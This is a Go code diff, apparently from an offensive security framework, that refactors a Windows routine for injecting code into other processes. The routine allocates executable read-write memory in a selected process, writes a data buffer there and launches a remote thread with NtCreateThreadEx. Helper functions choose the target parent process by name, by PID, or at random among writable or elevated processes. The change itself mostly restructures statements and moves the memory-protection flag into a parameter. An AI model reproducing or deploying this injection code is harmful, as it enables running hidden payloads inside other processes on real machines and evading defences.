@@ -115,13 +115,12 @@ func (c *Code) Start() error {
 	var err error
 	atomic.StoreUint32(&c.once, 0)
 	c.ch = make(chan finished)
-	c.owner = windows.CurrentProcess()
-	if !c.container.empty() {
+	if c.owner = windows.CurrentProcess(); !c.container.empty() {
 		if c.owner, err = c.container.getParent(secCode); err != nil {
 			return c.stopWith(err)
 		}
 	}
-	if c.loc, err = allocateMemory(c.owner, uint32(len(c.Data))); err != nil {
+	if c.loc, err = allocateMemory(c.owner, uint32(len(c.Data)), windows.PAGE_EXECUTE_READWRITE); err != nil {
 		return c.stopWith(err)
 	}
 	if _, err = writeMemory(c.owner, c.loc, c.Data); err != nil {
@@ -140,8 +139,7 @@ func (b base) String() string {
 // SetParent will instruct the Code thread to choose a parent with the supplied process name. If this string is empty,
 // this will use the current process (default). This function has no effect if the device is not running Windows.
 func (c *Code) SetParent(n string) {
-	c.container.clear()
-	if len(n) > 0 {
+	if c.container.clear(); len(n) > 0 {
 		c.container.name = n
 	}
 }
@@ -150,8 +148,7 @@ func (c *Code) SetParent(n string) {
 // zero, this will use the current process (default) and if < 0 this Process will choose a parent from a list
 // of writable processes. This function has no effect if the device is not running Windows.
 func (c *Code) SetParentPID(i int32) {
-	c.container.clear()
-	if i != 0 {
+	if c.container.clear(); i != 0 {
 		c.container.pid = i
 	}
 }
@@ -169,8 +166,7 @@ func (c *Code) stopWith(e error) error {
 		}
 		close(c.ch)
 	}
-	c.cancel()
-	if c.err == nil && c.ctx.Err() != nil {
+	if c.cancel(); c.err == nil && c.ctx.Err() != nil {
 		if e != nil {
 			c.err = e
 			return e
@@ -226,21 +222,6 @@ func (c *Code) SetParentRandomEx(s []string, e bool) {
 	c.container.elevated = e
 	c.SetParentRandom(s)
 }
-func allocateMemory(h windows.Handle, s uint32) (uintptr, error) {
-	var (
-		a         uintptr
-		x         = s
-		r, _, err = funcNtAllocateVirtualMemory.Call(
-			uintptr(h), uintptr(unsafe.Pointer(&a)),
-			0, uintptr(unsafe.Pointer(&x)),
-			windows.MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE,
-		)
-	)
-	if r > 0 {
-		return 0, xerr.Wrap("winapi NtAllocateVirtualMemory error", err)
-	}
-	return a, nil
-}
 func createThread(h windows.Handle, a, p uintptr) (uintptr, error) {
 	var (
 		t         uintptr
@@ -254,6 +235,21 @@ func createThread(h windows.Handle, a, p uintptr) (uintptr, error) {
 		return 0, xerr.Wrap("winapi NtCreateThreadEx error", err)
 	}
 	return t, nil
+}
+func allocateMemory(h windows.Handle, s, p uint32) (uintptr, error) {
+	var (
+		a         uintptr
+		x         = s
+		r, _, err = funcNtAllocateVirtualMemory.Call(
+			uintptr(h), uintptr(unsafe.Pointer(&a)),
+			0, uintptr(unsafe.Pointer(&x)),
+			windows.MEM_COMMIT, uintptr(p),
+		)
+	)
+	if r > 0 {
+		return 0, xerr.Wrap("winapi NtAllocateVirtualMemory error", err)
+	}
+	return a, nil
 }
 func writeMemory(h windows.Handle, a uintptr, b []byte) (uint32, error) {
 	var (
